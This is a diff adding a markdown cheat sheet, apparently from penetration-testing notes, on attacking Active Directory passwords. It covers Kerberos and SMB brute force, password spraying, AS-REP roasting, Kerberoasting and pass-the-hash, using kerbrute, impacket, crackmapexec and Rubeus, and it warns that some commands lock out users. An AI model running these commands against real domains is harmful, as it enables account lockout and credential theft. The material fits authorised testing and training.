@@ -1,0 +1,34 @@
+# Passwords
+## Kerberos
+Brute force - WILL LOCKOUT USER:
+`kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`
+
+Check password for userlist:
+`kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`
+
+AS-REP (AS-REP Roasting):
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (need creds)
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` (need creds)
+
+TGS-REP (Kerberoasting):
+`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (need creds)
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (need creds)
+
+## NetBIOS & SMB
+Brute force - WILL LOCKOUT USER:
+`crackmapexec smb <IP> -u <USER> -p <PASSLIST>`
+`crackmapexec smb <IP> -u <USER> -H <HASHES>`
+
+Check password for userlist:
+`crackmapexec smb <IP> -u <USERLIST> -p <PASS>`
+
+Change password user:
+`smbpasswd -U <USER> -r <DC_IP>`
+
+## Locally
+AS-REP (AS-REP Roasting):
+`Rubeus.exe asreproast /format:hashcat /nowrap`
+
+TGS-REP (Kerberoasting):
+`setspn -T medin -Q */*`
